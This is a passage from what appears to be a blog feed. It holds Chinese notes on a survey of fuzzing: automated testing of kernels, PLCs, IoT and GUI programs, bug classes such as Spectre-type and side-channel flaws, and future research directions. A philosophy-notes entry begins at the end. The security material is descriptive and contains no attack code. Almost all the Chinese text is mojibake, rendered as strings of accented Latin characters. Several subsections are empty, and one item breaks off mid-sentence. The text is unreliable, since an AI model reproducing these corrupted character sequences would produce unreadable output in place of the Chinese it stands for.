title="5.1 Automatic Execution of PUTs"></a>5.1 Automatic Execution of PUTs</h3><p>å¯¹ä¸åŒåº”ç”¨ç¨‹åºçš„è‡ªåŠ¨åŒ–æ¨¡ç³Šæµ‹è¯•éœ€è¦ä¸åŒçš„å·¥ç¨‹åŠªåŠ›ï¼Œæœ¬èŠ‚ä»‹ç»å‡ ç§è‡ªåŠ¨åŒ–æ¨¡ç³Šæµ‹è¯•çš„æ–¹æ³•</p><h4 id="5-1-1-Command-line-Programs"><a href="#5-1-1-Command-line-Programs" class="headerlink" title="5.1.1 Command-line Programs"></a>5.1.1 Command-line Programs</h4><h4 id="5-1-2-Deep-Learning-Systems"><a href="#5-1-2-Deep-Learning-Systems" class="headerlink" title="5.1.2 Deep Learning Systems"></a>5.1.2 Deep Learning Systems</h4><h4 id="5-1-3-Operating-System-Kernels"><a href="#5-1-3-Operating-System-Kernels" class="headerlink" title="5.1.3 Operating System Kernels"></a>5.1.3 Operating System Kernels</h4><p>OS kernel åŒ…å«äº†è®¸å¤šä¸­æ–­ä¸å†…æ ¸çº¿ç¨‹ï¼Œå…¶æ‰§è¡ŒçŠ¶æ€æ— æ³•ç¡®å®šï¼Œç”±æ­¤æˆ‘ä»¬ä½¿ç”¨ hypervisorï¼ˆå¦‚ QEMUï¼‰æ¥è¿è¡Œå†…æ ¸ï¼Œå¹¶é€šè¿‡Â <a href="https://zhangtong16.github.io/2019/06/05/Intel-Processor-Trace/">Intelâ€™s Processor Trace</a>Â ï¼ˆPTï¼‰æŠ€æœ¯æ¥è·å–ä»£ç è¦†ç›–ï¼›å°½ç®¡è¿™ç§æ–¹æ³•èƒ½å¸¦åé¦ˆåœ°æµ‹è¯•ä¸åŒç§å†…æ ¸ï¼Œä½†ä»éœ€è¦äººå·¥æ„é€ è¯­æ³•&amp;è¯­ä¹‰æ­£ç¡®çš„è¾“å…¥</p><p>å› ä¸ºè¾“å…¥åŒ…æ‹¬æ–‡ä»¶ç³»ç»Ÿé•œåƒæˆ–ä¸€ç³»åˆ—ç³»ç»Ÿè°ƒç”¨ï¼Œfuzzers å¯ä»¥ä»¥æ›´è½»é‡çº§çš„æ–¹æ³•è¿›è¡Œæµ‹è¯•ï¼šåœ¨ç³»ç»Ÿè°ƒç”¨çš„æ•°æ®ä¾èµ–é¡¹è¢«åˆ†æ&#x2F;æ¨æ–­å‡ºæ¥åç”Ÿæˆä¸€ç³»åˆ—ç³»ç»Ÿè°ƒç”¨å¹¶åœ¨ç›®æ ‡å†…æ ¸ä¸Šè¿è¡Œï¼Œå¹¶ç›‘æµ‹ä»£è¡¨æ½œåœ¨æ¼æ´çš„ system panics</p><p>å¦ä¸€ç§æµ‹è¯•æ–¹æ³•æ˜¯é€šè¿‡æ¨¡æ‹Ÿå¤–è®¾å¹¶ç”Ÿæˆç›¸åº”è¾“å…¥æ¥æµ‹è¯•å†…æ ¸é©±åŠ¨</p><h4 id="5-1-4-Cyber-Physical-Systems"><a href="#5-1-4-Cyber-Physical-Systems" class="headerlink" title="5.1.4 Cyber-Physical Systems"></a>5.1.4 Cyber-Physical Systems</h4><p><strong>ä¿¡æ¯ç‰©ç†ç³»ç»Ÿ</strong>ï¼ˆCyber-Physical Systemsï¼ŒCPSï¼‰åŒ…å«ä¸¤ä¸ªç´§å¯†ç»“åˆçš„ä¸»è¦æˆåˆ†ï¼Œå³<strong>è®¡ç®—å…ƒç´ </strong>ï¼ˆcomputational elementsï¼‰ä¸<strong>ç‰©ç†è¿‡ç¨‹</strong>ï¼ˆphysical processesï¼‰</p><p>ä¸€ä¸ªè¢«å¹¿æ³›ä½¿ç”¨çš„è®¡ç®—å…ƒç´ æ˜¯Â <em>å¯ç¼–ç¨‹é€»è¾‘æ§åˆ¶å™¨</em>Â ï¼ˆprogrammable logic controllerï¼ŒPLCï¼‰ï¼Œå…¶æ§åˆ¶ç€ç‰©ç†è¿‡ç¨‹çš„é©±åŠ¨å™¨å¹¶ä»ä¼ æ„Ÿå™¨ä¸­è·å–è¾“å…¥ï¼Œå› æ­¤åœ¨ fuzzing CPSs æ—¶ fuzzer å¯ä»¥æ›¿æ¢æ‰ PLCs å¹¶é€šè¿‡ç½‘ç»œç›´æ¥å‘é©±åŠ¨å™¨å‘é€å¤§é‡çš„å‘½ä»¤</p><p>PLC çš„äºŒè¿›åˆ¶æ–‡ä»¶ä¹Ÿæ˜¯ CPSs çš„ä¸€ä¸ªå¯æµ‹è¯•ç‚¹ï¼Œä½†å…¶æœ‰ç€å¤šç§äºŒè¿›åˆ¶æ ¼å¼ä»¥åŠå¤æ‚çš„ä¸ç‰©ç†å®ä½“é—´çš„é€šä¿¡ï¼›åŸºäºå¯¹ PLC äºŒè¿›åˆ¶æ–‡ä»¶ä¸å¼€å‘å¹³å°çš„åˆ†æï¼Œè‡ªåŠ¨åŒ–çš„ fuzz å¯ä»¥åœ¨å…¶è¿è¡Œåœ¨ PLC è®¾å¤‡ä¸Šæ—¶è¿›è¡Œ</p><h4 id="5-1-5-Internet-of-Things"><a href="#5-1-5-Internet-of-Things" class="headerlink" title="5.1.5 Internet of Things"></a>5.1.5 Internet of Things</h4><p>IOT çš„è‡ªåŠ¨åŒ– fuzzing åŒ…æ‹¬å›ºä»¶æ¨¡æ‹Ÿä¸ç½‘ç»œçº§æµ‹è¯•ï¼š</p><ul><li>æ¨¡æ‹Ÿå™¨å¯ä»¥åœ¨æ²¡æœ‰å¯¹åº”çš„ç¡¬ä»¶æ—¶æ¨¡æ‹Ÿè¿è¡Œ IOT å›ºä»¶ï¼Œä»¥ç°ç›’æ¨¡å¼æµ‹è¯•ç›®æ ‡ç¨‹åºã€‚</li><li>ç½‘ç»œçº§çš„ fuzzing ä»¥é»‘ç›’æ¨¡å¼è¿›è¡Œæµ‹è¯•ï¼Œå³é€šè¿‡ç½‘ç»œå‘ IOT è®¾å¤‡å‘é€ä¿¡æ¯ï¼Œä»¥å“åº”ä½œä¸ºæ‰§è¡Œç»“æœï¼Œfitness ä¾¿æ˜¯ç±»å‹æ•°é‡ã€‚</li></ul><h4 id="5-1-6-Applications-with-Graphical-User-Interface"><a href="#5-1-6-Applications-with-Graphical-User-Interface" class="headerlink" title="5.1.6 Applications with Graphical User Interface"></a>5.1.6 Applications with Graphical User Interface</h4><p>GUI ç¨‹åºçš„æ‰§è¡Œæ¯”å‘½ä»¤è¡Œæ…¢å¾—å¤šï¼Œè€Œæ‰§è¡Œé€Ÿåº¦æ˜¯ fuzzing çš„å…³é”®ï¼Œå› æ­¤å¯¹ GUI ç¨‹åºçš„è‡ªåŠ¨åŒ–æµ‹è¯•é€šå¸¸å°† GUI æ›¿æ¢ä¸ºä¸€ç§æ›´å¿«çš„æ–¹æ¡ˆå¹¶ä»¥å‘½ä»¤è¡Œæ¨¡å¼æ‰§è¡Œç›®æ ‡</p><blockquote><p>ä¾‹å¦‚å¯¹ UI æ“ä½œå»ºæ¨¡åä¸ºå®‰å“åº”ç”¨ç”Ÿæˆäº‹ä»¶åºåˆ—ï¼ˆevent sequencesï¼‰</p></blockquote><p>æ­¤å¤–ï¼Œfuzzer ä¹Ÿå¯ä»¥ä½¿ç”¨Â <strong>hardness</strong>Â æ¥å‡†å¤‡æ‰§è¡Œä¸Šä¸‹æ–‡ï¼Œä»¥ç›´æ¥å”¤é†’ GUIs ä¸­çš„ç›®æ ‡å‡½æ•°ã€‚</p><h4 id="5-1-7-Applications-with-Network"><a href="#5-1-7-Applications-with-Network" class="headerlink" title="5.1.7 Applications with Network"></a>5.1.7 Applications with Network</h4><p>æ™ºèƒ½åˆçº¦ã€åè®®å®ç°ã€äº‘æœåŠ¡ã€Android Native System Servicesã€æœºå™¨äººè£…ç½®ç­‰é€šè¿‡ç½‘ç»œæ¥æ”¶è¾“å…¥ï¼Œç”±æ­¤å¯ä»¥åœ¨æœ¬åœ°ç”Ÿæˆè¾“å…¥åç”±ç›®æ ‡åº”ç”¨è¿œç¨‹æ‰§è¡Œï¼Œè‡ªåŠ¨æµ‹è¯•çš„æ•ˆç‡ä¾èµ–äºç”Ÿæˆè¾“å…¥çš„è´¨é‡ä¸åæ˜ æ‰§è¡ŒçŠ¶æ€çš„ fitness</p><h3 id="5-2-Automatic-Detection-of-Bugs"><a href="#5-2-Automatic-Detection-of-Bugs" class="headerlink" title="5.2 Automatic Detection of Bugs"></a>5.2 Automatic Detection of Bugs</h3><h4 id="5-2-1-Memory-violaton-Bugs"><a href="#5-2-1-Memory-violaton-Bugs" class="headerlink" title="5.2.1 Memory-violaton Bugs"></a>5.2.1 Memory-violaton Bugs</h4><p>å†…å­˜ç ´åæ¼æ´ï¼ˆMemory-violaton Bugsï¼‰æ˜¯æœ€å¤è€ä¹Ÿæœ€ä¸¥é‡çš„å®‰å…¨æ¼æ´ï¼Œåˆ†ä¸ºä¸¤ç±»ï¼š</p><ul><li>ç©ºé—´å®‰å…¨æŸå</li><li>æ—¶é—´å®‰å…¨æŸå</li></ul><h4 id="5-2-2-å¹¶å‘æ¼æ´"><a href="#5-2-2-å¹¶å‘æ¼æ´" class="headerlink" title="5.2.2 å¹¶å‘æ¼æ´"></a>5.2.2 å¹¶å‘æ¼æ´</h4><p>å¹¶å‘å‹æ¼æ´</p><h4 id="5-2-3-Algorithmic-Complexity"><a href="#5-2-3-Algorithmic-Complexity" class="headerlink" title="5.2.3 Algorithmic Complexity"></a>5.2.3 Algorithmic Complexity</h4><p><strong>ç®—æ³•å¤æ‚æ€§</strong>ï¼ˆAlgorithm Complexityï¼ŒACï¼‰æ¼æ´æ˜¯ç®—æ³•åœ¨æœ€åæƒ…å†µä¸‹ä¼šæ˜¾è‘—çš„é™ä½æ€§èƒ½ï¼Œä»è€Œå¯èƒ½å¯¼è‡´æ‹’ç»æœåŠ¡ï¼ˆDenial-of-Serviceï¼‰æ”»å‡»ï¼ŒFig.9 å±•ç¤ºäº†ä¸€ä¸ªæœ‰ç€ä¸åŒç®—æ³•å¤æ‚åº¦çš„ä¾‹å­ï¼Œåœ¨æœ€åæƒ…å†µä¸‹å¯ä»¥è¢«æ”»å‡»è€…ç”¨ä½œ DoS æ”»å‡»ï¼š</p><h4 id="5-2-4-Spectre-type-Bugs"><a href="#5-2-4-Spectre-type-Bugs" class="headerlink" title="5.2.4 Spectre-type Bugs"></a>5.2.4 Spectre-type Bugs</h4><p><strong>å¹½çµå‹æ¼æ´</strong>ï¼ˆSpectre-type Bugsï¼‰æ˜¯ä¸€ç§åˆ©ç”¨é”™è¯¯åˆ†æ”¯é¢„æµ‹ï¼ˆmispredicted branch speculationsï¼‰æ¥æ§åˆ¶å†…å­˜è®¿é—®çš„å¾®æ¶æ„æ”»å‡»ï¼Œä¾‹å¦‚åœ¨ Fig.10 ä¸­æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æœ‰æ•ˆå€¼æ¥è®­ç»ƒåˆ†æ”¯é¢„æµ‹ä¸ºçœŸï¼Œéšåç»™å˜é‡ä¸€ä¸ª OOB çš„å€¼ï¼Œæ­¤æ—¶é¢„æµ‹å™¨ä¾¿ä¼šé”™è¯¯é¢„æµ‹åˆ†æ”¯è¡Œä¸ºï¼Œä»è€Œé”™è¯¯åœ°æ‰§è¡Œäº†ç¬¬3ã€4è¡Œä»£ç ï¼Œé€ æˆäº†è¶Šç•Œè¯»å–</p><h4 id="5-2-5-ä¾§ä¿¡é“"><a href="#5-2-5-ä¾§ä¿¡é“" class="headerlink" title="5.2.5 ä¾§ä¿¡é“"></a>5.2.5 ä¾§ä¿¡é“</h4><p><strong>ä¾§ä¿¡é“æ¼æ´</strong>ï¼ˆside-channelï¼‰é€šè¿‡å¯¹ç³»ç»Ÿçš„éåŠŸèƒ½æ€§è¡¨ç°ï¼ˆä¾‹å¦‚æ‰§è¡Œæ—¶é—´ï¼‰æ¥æ³„éœ²ä¿¡æ¯ï¼Œä¾‹å¦‚é€šè¿‡åˆ†æ”¯æ‰§è¡Œæ—¶é—´åˆ¤æ–­æ‰§è¡Œçš„åˆ†æ”¯</p><blockquote><p>è®ºæ–‡æ²¡ç»™ä¾‹å­ï¼Œé‚£ç¬”è€…ç»™å‡ºä¸€ä¸ªä¾‹å­ï¼š<a href="https://gruss.cc/files/prefetch.pdf">prefetch side-channel attack: bypassing SMAP and KASLR</a></p></blockquote><p><strong>JIT-induced side channels</strong>ï¼ˆ<del>ä¸æ‡‚å’‹ç¿»</del>ï¼‰æ˜¯ä¸€ç§ç”±å³æ—¶ä¼˜åŒ–ï¼ˆJust-In-Time Optimizationï¼‰å¯¼è‡´çš„ç‰¹æ®Šä¾§ä¿¡é“ï¼Œç±»ä¼¼äºå¹½çµå‹æ¼æ´ï¼Œé€šè¿‡è®­ç»ƒ JIT ç¼–è¯‘å™¨ä¼˜åŒ–å•ä¸€åˆ†æ”¯ä»¥ä½¿å¾—ä¸¤æ‰§è¡Œåˆ†æ”¯é—´æ‰§è¡Œæ—¶é—´å·®å¤§åˆ°å¯ä»¥è¢«è§‚æµ‹åˆ°</p><h4 id="5-2-6-Integer-Bugs"><a href="#5-2-6-Integer-Bugs" class="headerlink" title="5.2.6 Integer Bugs"></a>5.2.6 Integer Bugs</h4><p><strong>æ•´å‹ä¸Šæº¢&#x2F;ä¸‹æº¢</strong>ï¼ˆInteger Overflow&#x2F;Underflowï¼‰åœ¨ç®—æœ¯è¡¨è¾¾å¼çš„å€¼è¶…è¿‡æœºå™¨ç±»å‹æ‰€å†³å®šçš„èŒƒå›´æ—¶å‘ç”Ÿï¼Œæˆ–æ˜¯åœ¨æ•´å‹é—´è½¬æ¢æ—¶å‘ç”Ÿï¼ˆæ¯”å¦‚ int to uintï¼‰</p><blockquote><p>è®ºæ–‡ä¸¾äº†è¿™ä¸ªä¾‹å­ï¼š<a href="https://dl.acm.org/doi/10.5555/1855768.1855773">SmartFuzz</a></p></blockquote><h3 id="5-3-Improvement-of-Execution-Speed"><a href="#5-3-Improvement-of-Execution-Speed" class="headerlink" title="5.3 Improvement of Execution Speed"></a>5.3 Improvement of Execution Speed</h3><h4 id="5-3-1-äºŒè¿›åˆ¶åˆ†æ"><a href="#5-3-1-äºŒè¿›åˆ¶åˆ†æ" class="headerlink" title="5.3.1 äºŒè¿›åˆ¶åˆ†æ"></a>5.3.1 äºŒè¿›åˆ¶åˆ†æ</h4><p><strong>é™æ€æ’æ¡©</strong>ï¼ˆstatic instrumentationï¼‰æ˜¯ä¸»æµçš„è·å–æ‰§è¡ŒçŠ¶æ€çš„æ–¹å¼ï¼Œå› ä¸ºå…¶ä¸º fuzzing æä¾›äº†æ›´é«˜çš„æ‰§è¡Œé€Ÿåº¦ã€‚</p><ul><li>å¯¹å¼€æºç¨‹åºè€Œè¨€ï¼Œä¸€ä¸ªè¢«å¹¿æ³›ä½¿ç”¨çš„é™æ€åˆ†æå·¥å…·æ˜¯ LLVMï¼Œå…¶åœ¨ç¼–è¯‘å™¨è¿›è¡Œæ’æ¡©ã€‚</li><li>å¯¹äºé—­æºç¨‹åºè€Œè¨€ï¼Œfuzzer è¢«é™åˆ¶äºäºŒè¿›åˆ¶åˆ†æï¼Œä½†äºŒè¿›åˆ¶æ’æ¡©å·¥å…·æœ‰ç€ä¸è²çš„è¿è¡Œæ—¶å¼€é”€</li></ul><h4 id="5-3-2-Execution-Process"><a href="#5-3-2-Execution-Process" class="headerlink" title="5.3.2 Execution Process"></a>5.3.2 Execution Process</h4><p>æ‰§è¡Œé€Ÿåº¦åŒæ ·å¯ä»¥åœ¨æ¨¡ç³Šæµ‹è¯•è¿‡ç¨‹ä¸­æå‡</p><h4 id="5-3-3-å„ç§åº”ç”¨"><a href="#5-3-3-å„ç§åº”ç”¨" class="headerlink" title="5.3.3 å„ç§åº”ç”¨"></a>5.3.3 å„ç§åº”ç”¨</h4><p>æ¨¡ç³Šæµ‹è¯•è¢«ç”¨ä»¥æ£€æµ‹å¤šç§ç›®æ ‡ä¸­çš„ç¼ºé™·ï¼Œå¦‚ IOTã€OS Kernel VMM ç­‰ï¼Œéœ€è¦æ ¹æ®ç›®æ ‡ç‰¹æ€§è¿›è¡Œå®šåˆ¶åŒ–ã€‚</p><p>è®ºæ–‡ç»™å‡ºäº†è¿™äº›ä¾‹å­ï¼š</p><ul><li>FIRM-AFL é€šè¿‡ç»“åˆç”¨æˆ·æ€æ¨¡æ‹Ÿä¸å…¨ç³»ç»Ÿæ¨¡æ‹Ÿæ¥ç¼“è§£ä¼ ç»Ÿ IOT å›ºä»¶ fuzzing ä¸­å…¨ç³»ç»Ÿæ¨¡æ‹Ÿå¸¦æ¥çš„è™šæ‹Ÿåœ°å€ä¸å†…å­˜è®¿é—®é—´ç¿»è¯‘åŠæ¨¡æ‹Ÿç³»ç»Ÿè°ƒç”¨çš„å¼€é”€</li><li>Schumilo è®¾è®¡äº†ä¸€ç§</li></ul><h2 id="0x06-Fuzzing-æœªæ¥ç ”ç©¶æ–¹å‘"><a href="#0x06-Fuzzing-æœªæ¥ç ”ç©¶æ–¹å‘" class="headerlink" title="0x06 Fuzzing æœªæ¥ç ”ç©¶æ–¹å‘"></a>0x06 Fuzzing æœªæ¥ç ”ç©¶æ–¹å‘</h2><p>Fuzzing æœªæ¥çš„ç ”ç©¶æ–¹å‘ä¸æŒ‘æˆ˜ï¼š</p><ul><li><p><strong>æ›´çµæ•çš„é€‚åº”åº¦å‡½æ•°ï¼ˆMore sensitive fitnessï¼‰</strong>ï¼šç ”ç©¶äººå‘˜æ„è¯†åˆ°ä»…ä¾é ä»£ç è¦†ç›–ç‡åœ¨å‘ç°å¤æ‚æ¼æ´æ—¶å­˜åœ¨å±€é™æ€§ï¼Œå› æ­¤å°è¯•å¼•å…¥åŸºäºæ¼æ´åˆ†æè·å¾—çš„ä¿¡æ¯æ¥æ”¹è¿›é€‚åº”åº¦å‡½æ•°ã€‚æœªæ¥å·¥ä½œå¯èšç„¦äºåŸºäºæ¼æ´ç‰¹æ€§è¿›è¡Œæ¼æ´æ£€æµ‹ï¼Œå°¤å…¶æ˜¯é’ˆå¯¹ç°æœ‰æ¨¡ç³Šæµ‹è¯•æœªèƒ½å‘ç°çš„æ¼æ´è¿›è¡Œæ·±å…¥åˆ†æã€‚</p></li><li><p><strong>æ›´å®Œå–„çš„æ¨¡ç³Šæµ‹è¯•ç†è®ºï¼ˆMore sophisticated fuzzing theoryï¼‰</strong>ï¼šç›®å‰å¤§éƒ¨åˆ†ç ”ç©¶é›†ä¸­äºç§å­è°ƒåº¦ï¼Œå°‘æ•°å…³æ³¨æ¨¡ç³Šæµ‹è¯•çš„å…¶ä»–ç¯èŠ‚ã€‚æ„å»ºå®Œæ•´çš„æ•°å­¦æ¨¡å‹è™½ä¸æ˜“ï¼Œä½†å¤šç§æ¨¡ç³Šæµ‹è¯•è¿‡ç¨‹å¯å…±å­˜ï¼Œä¾‹å¦‚åˆ©ç”¨åšå¼ˆè®ºåŒæ—¶è€ƒè™‘ç§å­è°ƒåº¦ä¸å­—èŠ‚è°ƒåº¦ã€‚æœªæ¥æ›´å®å¤§çš„ç ”ç©¶æ–¹å‘åŒ…æ‹¬æ¢ç´¢æ¨¡ç³Šæµ‹è¯•ç†è®ºçš„å±€é™æ€§ï¼ˆå¦‚ç°ç›’æ¨¡ç³Šæµ‹è¯•çš„é™åˆ¶ï¼‰ï¼Œä»¥åŠç»“åˆå¤šç§é€‚åº”åº¦å‡½æ•°ï¼Œè®¾è®¡æ—¢è€ƒè™‘æ¼æ´å‡ºç°åˆå…¼é¡¾çŠ¶æ€è½¬ç§»çš„å…ˆè¿›æ¨¡ç³Šæµ‹è¯•è¿‡ç¨‹ã€‚</p></li><li><p><strong>ç§‘å­¦çš„è¯„ä¼°æ–¹æ³•ï¼ˆSound evaluationï¼‰</strong>ï¼šéƒ¨åˆ†å·¥ä½œå…³æ³¨è¯„ä¼°çš„å¯é æ€§ï¼Œä½†å°šæ— å®šè®ºï¼ˆè§ Â§3.6ï¼‰ã€‚äºŸå¾…è§£å†³çš„é—®é¢˜åŒ…æ‹¬ï¼šè¯„ä¼°è¯­æ–™åº“åº”ä½¿ç”¨çœŸå®æ¼æ´è¿˜æ˜¯åˆæˆæ¼æ´ï¼Ÿé™æ€æµ‹è¯•èƒ½å¦ä½œä¸ºåŒºåˆ†æ¨¡ç³Šæµ‹è¯•æŠ€æœ¯çš„æœ€ç»ˆæ ‡å‡†ï¼Ÿåˆç†çš„æ—¶é—´é¢„ç®—å¦‚ä½•ç¡®å®šï¼Ÿå¦‚ä½•åœ¨ç¼ºä¹å¯æ¯”è¾ƒæ¨¡ç³Šæµ‹è¯•å™¨çš„æƒ…å†µä¸‹è¯„ä¼°ç‰¹æ®Šç›®æ ‡ï¼ˆå¦‚ç¡¬ä»¶ï¼‰ï¼Ÿ</p></li><li><p><strong>å¯æ‰©å±•çš„è¾“å…¥æ ¼å¼æ¨æ–­ï¼ˆScalable input inferenceï¼‰</strong>ï¼šåˆ©ç”¨æ ¼å¼æˆ–æ•°æ®ä¾èµ–é¡¹å¯æ˜¾è‘—æå‡æ¨¡ç³Šæµ‹è¯•æ•ˆç‡ï¼ˆè§ Â§4.6 å’Œ Â§4.7ï¼‰ã€‚é™æ€åˆ†æå¹¿æ³›ç”¨äºæ ¼å¼å’Œæ•°æ®ä¾èµ–æ¨æ–­ï¼Œä½†å…¶ç»“æœé«˜åº¦ä¾èµ–ç‰¹å®šç¨‹åºä¸”å®ç°å¤æ‚ã€‚åŠ¨æ€åˆ†æä¸»è¦å…³æ³¨æ ¼å¼æ¨æ–­ï¼Œè¾ƒå°‘æ¶‰åŠæ•°æ®ä¾èµ–æ¨æ–­ï¼Œä½†å…·æœ‰æ›´å¥½çš„å¯æ‰©å±•æ€§ã€‚</p></li><li><p><strong>é«˜æ•ˆçš„å˜å¼‚æ“ä½œç¬¦ï¼ˆEfficient mutation operatorsï¼‰</strong> å‡ ä¹æ‰€æœ‰æ¨¡ç³Šæµ‹è¯•å·¥å…·éƒ½é‡‡ç”¨æ··åˆå˜å¼‚å™¨ï¼Œä½†é€šå¸¸ä¸åŠ¨æ€è°ƒæ•´å˜å¼‚å™¨ã€‚éƒ¨åˆ†ç ”ç©¶ä¼˜åŒ–äº†å˜å¼‚å™¨è°ƒåº¦ï¼Œä½†é²œæœ‰å…³æ³¨å¯å˜å˜å¼‚å™¨è®¾è®¡ã€‚é‰´äºå˜å¼‚å™¨è°ƒåº¦ä¸å­—èŠ‚è°ƒåº¦å¯†åˆ‡ç›¸å…³ï¼Œæœªæ¥å¯æ¢ç´¢åŸºäºå­—èŠ‚è°ƒåº¦çš„å˜å¼‚å™¨è®¾è®¡ï¼Œç‰¹åˆ«æ˜¯åœ¨å¤„ç†é«˜åº¦ç»“æ„åŒ–è¾“å…¥æ—¶çš„è°ƒåº¦ç­–ç•¥ã€‚</p></li><li><p><strong>æ›´å¤šç±»å‹çš„åº”ç”¨åœºæ™¯ï¼ˆMore types of applicationsï¼‰</strong>ï¼šç”±äºåº”ç”¨å¤æ‚æ€§ï¼Œæ¨¡ç³Šæµ‹è¯•åœ¨æ£€æµ‹æŸäº›åº”ç”¨ï¼ˆå¦‚ CPSsï¼‰æ—¶èƒ½åŠ›æœ‰é™ã€‚é‰´äºæ‰§è¡Œé€Ÿåº¦å¯¹æ¨¡ç³Šæµ‹è¯•çš„é‡è¦æ€§ï¼Œæå‡éš¾ä»¥è¢«æ¨¡ç³Šæµ‹è¯•çš„ç¨‹åºçš„æ‰§è¡Œæ•ˆç‡æ˜¯æ½œåœ¨çš„å‘å±•æ–¹å‘ã€‚</p></li><li><p><strong>æ›´å¤šç±»å‹çš„æ¼æ´ï¼ˆMore types of bugsï¼‰</strong>ï¼šæ¨¡ç³Šæµ‹è¯•åœ¨æ£€æµ‹å†…å­˜ç ´åã€å¹¶å‘æ¼æ´ã€ç®—æ³•å¤æ‚æ€§æ¼æ´ç­‰æ–¹é¢è¡¨ç°è‰¯å¥½ï¼ˆè§ Â§5.2ï¼‰ï¼Œä½†åœ¨æƒé™æå‡ã€é€»è¾‘æ¼æ´ç­‰æ–¹é¢ä»æœ‰æŒ‘æˆ˜ã€‚è®¾è®¡åˆé€‚çš„æ¼æ´æ£€æµ‹æŒ‡æ ‡ï¼ˆindicatorï¼‰å°¤ä¸ºå›°éš¾ï¼Œéœ€è¦ç ”ç©¶äººå‘˜åŒæ—¶å…·å¤‡å¯¹æ¨¡ç³Šæµ‹è¯•æŠ€æœ¯å’Œç›®æ ‡æ¼æ´çš„æ·±åˆ»ç†è§£ã€‚</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Fuzz </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Paper </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¤§ä¼—å“²å­¦ç¬”è®°</title>
      <link href="/2025/07/01/notes/philosophy/"/>
      <url>/2025/07/01/notes/philosophy/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å»å¹´æš‘å‡å®éªŒå®¤è¦è¿æ¥é¢†å¯¼æ£€æŸ¥æ—¶ï¼Œæ²¡åœ°æ–¹å¾…çš„æˆ‘åªèƒ½è·‘åˆ°åŒºå›¾ä¹¦é¦†è¯»ä¹¦ï¼Œåœ¨å“²å­¦ç›¸å…³ä¹¦ç±çš„ä¹¦æ¶ä¸Šç¿»åˆ°äº†è¿™æœ¬ä¹¦ï¼Œå½“çœ‹åˆ°åºç« ä¸­çš„ä¸€å¥è¯ä¾¿è¢«å…¶æ·±æ·±çš„å¸å¼•ï¼Œé‚æ·±å…¥é˜…è¯»ã€‚ä¹‹åç¦»å¼€å‰è®°ä¸‹äº†è¿™æœ¬ä¹¦ç±çš„åå­—ä¸Šç½‘è´­ä¹°äº†ä¸€æœ¬ã€‚ä½†å› åæ¥æ¯”èµ›äº‹ç‰©ç¹å¿™ï¼Œé‚é—å¿˜äºä¹¦æ¶ä¸Šï¼Œæ˜¨å¤©æ•´ç†ä¹¦ç±æ—¶ï¼Œåˆçœ‹åˆ°äº†è¿™æœ¬ä¹¦ã€‚ä¾¿å†³å®šä¼´ä¹‹äºæ‰‹æ—ï¼Œæ—¶æ—¶ç¿»é˜…ã€‚</p><img src="assets/870e17cf66c2b59e13e210b0da34ba8.jpg" style="zoom: 50%;" /><h2 id="åºç« "><a href="#åºç« " class="headerlink" title="åºç« "></a>åºç« </h2><h3 id="å“²å­¦ä¸æ—¥å¸¸ç”Ÿæ´»çš„å…³ç³»"><a href="#å“²å­¦ä¸æ—¥å¸¸ç”Ÿæ´»çš„å…³ç³»" class="headerlink" title="å“²å­¦ä¸æ—¥å¸¸ç”Ÿæ´»çš„å…³ç³»"></a>å“²å­¦ä¸æ—¥å¸¸ç”Ÿæ´»çš„å…³ç³»</h3><p>å¹¶ä¸æ˜¯å“²å­¦è¯¾æœ¬ä¸­æ‰æœ‰å“²å­¦ï¼Œåƒä¸‡äººåœ¨æ—¥å¸¸çš„ç”Ÿæ´»å’Œç¤¾ä¼šæ–—äº‰ä¸­æ‰€å‘ç”Ÿçš„æ€æƒ³é‡Œé¢åŒæ ·å­˜åœ¨ç€å“²å­¦æ€æƒ³çš„æ ¹è‹—ã€‚</p><p>ä»¥ä¸Šè¿™å¥è¯çš„ä¸¤ä¸ªå«ä¹‰ï¼š</p><ol><li>å“²å­¦å¹¶ä¸ç¥å¥‡ç„å¦™ï¼Œå®ƒä¸æˆ‘ä»¬çš„æ—¥å¸¸ç”Ÿæ´»è”ç³»çš„å¾ˆç´§å¯†ã€‚</li><li>æ—¥å¸¸ç”Ÿæ´»ä¸­åªå­˜åœ¨ç€å“²å­¦æ€æƒ³çš„æ ¹è‹—ï¼Œå¹¶ä¸å­˜åœ¨ç³»ç»Ÿçš„å®Œæ•´çš„å“²å­¦æ€æƒ³ã€‚</li></ol><h3 id="å“²å­¦æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#å“²å­¦æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="å“²å­¦æ˜¯ä»€ä¹ˆï¼Ÿ"></a>å“²å­¦æ˜¯ä»€ä¹ˆï¼Ÿ</h3><p>äººä»¬åœ¨é¢å¯¹ç”Ÿæ´»çš„å„ç§æ„Ÿæƒ³ä¸­å°±åŒ…å«ç€å„ç§å“²å­¦æ€æƒ³ã€‚</p><p>å“²å­¦å°±æ˜¯äººä»¬å¯¹äºæ•´ä¸ªä¸–ç•Œçš„æ ¹æœ¬è®¤è¯†æˆ–æ ¹æœ¬çœ‹æ³•ï¼Œä¹Ÿå°±æ˜¯ä¸–ç•Œè§‚ã€‚ä¸åŒçš„äººå¯¹äºä¸–ç•Œæœ‰ä¸åŒçš„è®¤è¯†ã€‚è€Œè¿™æ˜¯ç”±æ¯ä¸ªäººçš„é˜¶çº§å¤„å¢ƒå’Œåœ°ä½å†³å®šçš„ã€‚</p><p>å“²å­¦æ€æƒ³ä¸»è¦è§£ç­”æ•´ä¸ªä¸–ç•Œçš„é—®é¢˜ï¼Œå…¶ä»–æ€æƒ³ä¸»è¦è§£ç­”æŸä¸€äº‹ç‰©çš„é—®é¢˜ã€‚</p><p>å“²å­¦æ€æƒ³æ˜¯å…¶ä»–å„ç§æ€æƒ³çš„ä¸–ç•Œè§‚åŸºç¡€ã€‚</p><h2 id="å”¯å¿ƒè®ºã€äºŒå…ƒè®ºå’Œå”¯ç‰©è®º"><a href="#å”¯å¿ƒè®ºã€äºŒå…ƒè®ºå’Œå”¯ç‰©è®º" class="headerlink" 